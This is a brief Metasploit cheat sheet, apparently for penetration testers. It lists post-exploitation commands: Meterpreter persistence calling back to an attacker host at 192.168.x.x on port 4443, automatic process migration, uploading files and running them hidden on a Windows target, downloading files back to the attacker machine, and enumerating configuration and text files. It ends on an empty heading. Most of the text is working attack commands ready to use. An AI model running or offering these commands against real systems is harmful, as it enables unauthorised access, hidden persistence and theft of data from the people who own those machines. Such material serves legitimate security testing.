# Metasploit

Create Persistence:

```bash
run persistence -U -i 5 -p 4443 -r 192.168.x.x
```

Auto Migration – Process jumping:

```bash
touch CommandsOnExecute.rc
echo run post/windows/manage/migrate
and inside metasploit, write:
set autorunscript /root/ CommandsOnExecute.rc
```

Files in Metasploit:
Upload files:

```bash
meterpreter > upload /path/to/file/in/kali/file.exe  c:\\\\remote\\\\path\\\\on windows
```

Exec files:

```bash
meterpreter > execute -f  "c:\\\\remote\\\\path\\\\on windows"
```

(execute -H for Hidden execution)

Download files:

```bash
meterpreter > download c:\\\\remote\\\\path\\\\on windows    /root/local/path/of/kali
```

Auto Internal File Enumeration:

```bash
use post/windows/gather/enum_files
set FILE_GLOBS *.conf OR *.rtf OR *.txt
set search_from c:\\\\users\\\\ptbox
set session [session_number]
run
```

One liner start meterpreter
